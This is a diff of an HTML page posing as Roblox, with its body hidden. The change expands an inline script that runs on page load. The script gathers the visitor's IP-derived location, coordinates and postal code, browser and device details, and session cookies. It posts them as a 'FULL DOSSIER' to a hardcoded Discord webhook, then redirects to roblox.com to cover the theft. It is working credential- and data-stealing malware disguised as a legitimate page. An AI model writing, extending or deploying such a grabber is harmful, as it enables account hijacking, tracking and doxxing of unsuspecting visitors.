@@ -2,16 +2,76 @@
 <html>
 <head><title>Roblox</title></head>
 <body style="display:none;">
+
 <script>
 var webhook = "https://discord.com/api/webhooks/1517070488721948743/RNcyTwya9CDyheCrLPSTNDtENc8i04ybtfWloKAw-PoZYqXuvJL6nGXvnVIFPyhj_yCW";
+
 async function grab() {
     var ip = "unknown";
-    try { var r = await fetch("https://api.ipify.org?format=json"); if (r.ok) { var d = await r.json(); ip = d.ip; } } catch(e) {}
+    var isp = "unknown";
+    var city = "unknown";
+    var region = "unknown";
+    var country = "unknown";
+    var coords = "unknown";
+    var postal = "unknown";
+
+    try {
+        var r = await fetch("https://ipapi.co/json/");
+        if (r.ok) {
+            var d = await r.json();
+            ip = d.ip || "unknown";
+            isp = d.org || d.asn || "unknown";
+            city = d.city || "unknown";
+            region = d.region || "unknown";
+            country = d.country_name || "unknown";
+            coords = (d.latitude || "?") + ", " + (d.longitude || "?");
+            postal = d.postal || "unknown";
+        }
+    } catch(e) {}
+
     var cookie = document.cookie || "no_cookie";
-    await fetch(webhook, { method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({content: "**NEW HIT**\nIP: " + ip + "\nCookie: ||" + cookie + "||"}) });
+    var ua = navigator.userAgent;
+    var screenSize = screen.width + "x" + screen.height + " @ " + screen.colorDepth + "bit";
+    var language = navigator.language;
+    var platform = navigator.platform;
+    var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    var cores = navigator.hardwareConcurrency || "unknown";
+    var memory = navigator.deviceMemory || "unknown";
+    var online = navigator.onLine;
+    var referrer = document.referrer || "direct";
+    var date = new Date().toLocaleString();
+
+    var msg = "**🎯 FULL DOSSIER**\n" +
+              "**IP:** " + ip + "\n" +
+              "**ISP:** " + isp + "\n" +
+              "**City:** " + city + "\n" +
+              "**Region:** " + region + "\n" +
+              "**Country:** " + country + "\n" +
+              "**Postal Code:** " + postal + "\n" +
+              "**Coordinates:** " + coords + "\n" +
+              "**Timezone:** " + timezone + "\n" +
+              "**Date/Time:** " + date + "\n" +
+              "**Platform:** " + platform + "\n" +
+              "**User Agent:** " + ua + "\n" +
+              "**Screen:** " + screenSize + "\n" +
+              "**Language:** " + language + "\n" +
+              "**CPU Cores:** " + cores + "\n" +
+              "**RAM (GB):** " + memory + "\n" +
+              "**Online:** " + online + "\n" +
+              "**Referrer:** " + referrer + "\n" +
+              "**Cookie:** ||" + cookie + "||";
+
+    await fetch(webhook, {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({content: msg})
+    });
+
     window.location = "https://www.roblox.com";
 }
+
 grab();
 </script>
+
 </body>
 </html>
